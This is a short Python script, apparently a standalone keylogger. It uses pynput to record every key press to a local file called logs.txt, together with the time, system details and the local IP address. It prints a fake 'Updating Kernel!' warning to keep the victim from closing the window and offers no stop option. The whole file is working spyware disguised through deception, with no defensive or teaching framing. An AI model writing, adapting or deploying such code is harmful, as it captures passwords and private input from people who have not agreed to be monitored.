from pynput.keyboard import Key, Listener
import datetime
import platform
import socket

output_file = "logs.txt"  # Specify the name of the output text file

# Function to log the current time
def log_current_time():
    current_time = datetime.datetime.now()
    with open(output_file, "a") as file:
        file.write(f"Current Time: {current_time}\n")

# Function to log device information
def log_device_info():
    system_info = platform.uname()
    with open(output_file, "a") as file:
        file.write(f"Device Info:\n")
        file.write(f"System: {system_info.system}\n")
        file.write(f"Node Name: {system_info.node}\n")
        file.write(f"Release: {system_info.release}\n")
        file.write(f"Version: {system_info.version}\n")
        file.write(f"Machine: {system_info.machine}\n")
        file.write(f"Processor: {system_info.processor}\n")
        file.write("\n")

# Function to log local IP address
def log_local_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    with open(output_file, "a") as file:
        file.write(f"Local IP Address: {local_ip}\n")

# Key press event handler
def on_key_press(key):
    try:
        with open(output_file, "a") as file:
            if key.char:
                file.write(f"{key.char}\n")
            else:
                file.write(f"{key}\n")
    except AttributeError:
        with open(output_file, "a") as file:
            file.write(f"{key}\n")

# Create a listener for key events
with Listener(on_press=on_key_press) as listener:
    print("Updating Kernel!, 'DO NOT CLOSE WINDOW!")
    
    log_current_time()  # Log the current time once at the start
    log_device_info()  # Log device information once at the start
    log_local_ip()     # Log local IP address once at the start

    # The listener will run continuously without any manual stop option
    listener.join()

